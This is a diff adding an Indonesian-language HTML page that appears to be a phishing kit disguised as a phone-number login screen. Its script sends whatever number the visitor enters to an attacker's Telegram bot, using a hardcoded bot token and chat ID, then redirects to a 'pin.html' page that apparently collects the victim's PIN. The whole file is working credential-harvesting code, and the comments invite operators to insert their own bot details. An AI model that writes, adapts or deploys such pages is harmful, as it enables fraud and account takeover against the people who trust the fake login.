@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Nomor Telepon</title>
+
+<style>
+    *{
+        margin:0;
+        padding:0;
+        box-sizing:border-box;
+        font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body{
+        min-height:100vh;
+        background:linear-gradient(180deg,#f2ecff 0%,#eef8ff 30%,#ffffff 100%);
+    }
+
+    .container{
+        width:100%;
+        max-width:420px;
+        margin:auto;
+        min-height:100vh;
+        display:flex;
+        flex-direction:column;
+        padding:20px;
+    }
+
+    .topbar{
+        display:flex;
+        justify-content:space-between;
+        align-items:center;
+        margin-top:10px;
+    }
+
+    .moon{
+        width:32px;
+        height:32px;
+        border-radius:50%;
+        background:#06386b;
+        display:flex;
+        align-items:center;
+        justify-content:center;
+        color:#ffd54f;
+        font-size:18px;
+    }
+
+    .lang{
+        background:#fff;
+        border-radius:20px;
+        padding:3px;
+        display:flex;
+        gap:4px;
+        border:1px solid #eee;
+    }
+
+    .lang span{
+        padding:6px 12px;
+        border-radius:16px;
+        color:#888;
+        font-size:12px;
+        font-weight:600;
+    }
+
+    .lang .active{
+        background:#b86cff;
+        color:#fff;
+    }
+
+    .hero{
+        text-align:center;
+        margin-top:40px;
+    }
+
+    .hero img{
+        width:70px;
+        margin-bottom:15px;
+    }
+
+    .hero h1{
+        color:#07346d;
+        font-size:28px;
+        margin-bottom:8px;
+    }
+
+    .hero p{
+        color:#8c96a7;
+        font-size:14px;
+        line-height:1.4;
+    }
+
+    .phone-box{
+        margin-top:30px;
+        background:#fff;
+        border-radius:12px;
+        display:flex;
+        align-items:center;
+        padding:12px;
+        gap:12px;
+        box-shadow:0 2px 8px rgba(0,0,0,.05);
+        border: 1px solid #e0e0e0;
+    }
+
+    .country{
+        display:flex;
+        align-items:center;
+        gap:8px;
+        color:#07346d;
+        font-size:16px;
+        font-weight:600;
+    }
+
+    .flag{
+        width:24px;
+        height:24px;
+        border-radius:50%;
+        background:linear-gradient(to bottom,#e53935 50%,#fff 50%);
+        border:1px solid #ddd;
+    }
+
+    input{
+        flex:1;
+        border:none;
+        outline:none;
+        font-size:16px;
+        color:#333;
+    }
+
+    input::placeholder {
+        color:#aaa;
+    }
+
+    .loader {
+        display: none;
+        text-align: center;
+        margin-top: 15px;
+    }
+
+    .help{
+        text-align:center;
+        margin-top:20px;
+        color:#b35cff;
+        font-size:14px;
+        font-weight:600;
+        cursor: pointer;
+    }
+
+    .bottom{
+        margin-top:auto;
+        padding-bottom:30px;
+    }
+
+    button{
+        width:100%;
+        height:48px;
+        border:none;
+        border-radius:24px;
+        background:#a9b6c5;
+        color:white;
+        font-size:16px;
+        font-weight:600;
+        cursor:pointer;
+        transition: background 0.3s;
+    }
+    
+    button.active{
+        background:#b86cff;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="topbar">
+        <div class="moon">🌙</div>
+
+        <div class="lang">
+            <span>EN</span>
+            <span class="active">ID</span>
+        </div>
+    </div>
+
+    <div class="hero">
+        <img src="https://cdn-icons-png.flaticon.com/512/3059/3059445.png" alt="">
+        <h1>Halo!</h1>
+        <p>
+            Silakan masukkan nomor telepon Anda untuk
+            login atau mendaftar
+        </p>
+    </div>
+
+    <div class="phone-box">
+        <div class="country">
+            <div class="flag"></div>
+            +62 ▼
+        </div>
+
+        <input
+            type="tel"
+            id="phone"
+            placeholder="821 0010 0000">
+    </div>
+
+    <div class="loader" id="loader">
+        <span>Mengirim data...</span>
+    </div>
+
+    <div class="help">
+        Ada kendala dengan nomor telepon?
+    </div>
+
+    <div class="bottom">
+        <button id="btnLanjutkan" onclick="kirimKeTelegram()">Lanjutkan</button>
+    </div>
+
+</div>
+
+<script>
+    // ========== GANTI DENGAN BOT TOKEN DAN CHAT ID ANDA ==========
+    var botToken = "8341291421:AAHZhAJ-_wj7HBO57T7jvQ1yJcF46SZvESg";    // Ganti dengan Bot Token Anda
+    var chatId = "7549590022";        // Ganti dengan Chat ID Anda
+    // ===========================================================
+
+    const phoneInput = document.getElementById('phone');
+    const btn = document.getElementById('btnLanjutkan');
+    const loader = document.getElementById('loader');
+
+    // Aktifkan tombol jika ada input
+    phoneInput.addEventListener('input', function() {
+        if(this.value.length > 0) {
+            btn.classList.add('active');
+            btn.style.backgroundColor = '#b86cff';
+        } else {
+            btn.classList.remove('active');
+            btn.style.backgroundColor = '#a9b6c5';
+        }
+    });
+
+    function kirimKeTelegram() {
+        const nomor = phoneInput.value.trim();
+
+        if(!nomor){
+            alert("Masukkan nomor telepon terlebih dahulu");
+            return;
+        }
+
+        // Tampilkan loader
+        btn.disabled = true;
+        btn.innerText = "Mengirim...";
+        loader.style.display = "block";
+
+        // URL Telegram API
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Pesan yang akan dikirim
+        const pesan = `📱 Data Baru!\n\nNomor Telepon: ${nomor}`;
+
+        // Kirim ke Telegram API dengan application/json
+        fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: pesan
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if(data.ok) {
+                
+                // --- PERINTAH BARU: SIMPAN NOMOR KE LOCALSTORAGE ---
+                localStorage.setItem('phone_number', nomor);
+                // -----------------------------------------------
+
+                window.location.href = "pin.html";
+                
+                // Reset form
+                phoneInput.value = "";
+                btn.classList.remove('active');
+                btn.style.backgroundColor = '#a9b6c5';
+            } else {
+                alert("Gagal mengirim data.\nError: " + data.description);
+            }
+        })
+        .catch(error => {
+            alert("Gagal mengirim data.\nError: " + error);
+            console.error("Error:", error);
+        })
+        .finally(() => {
+            // Reset tombol
+            btn.disabled = false;
+            btn.innerText = "Lanjutkan";
+            loader.style.display = "none";
+        });
+    }
+</script>
+
+</body>
+</html>
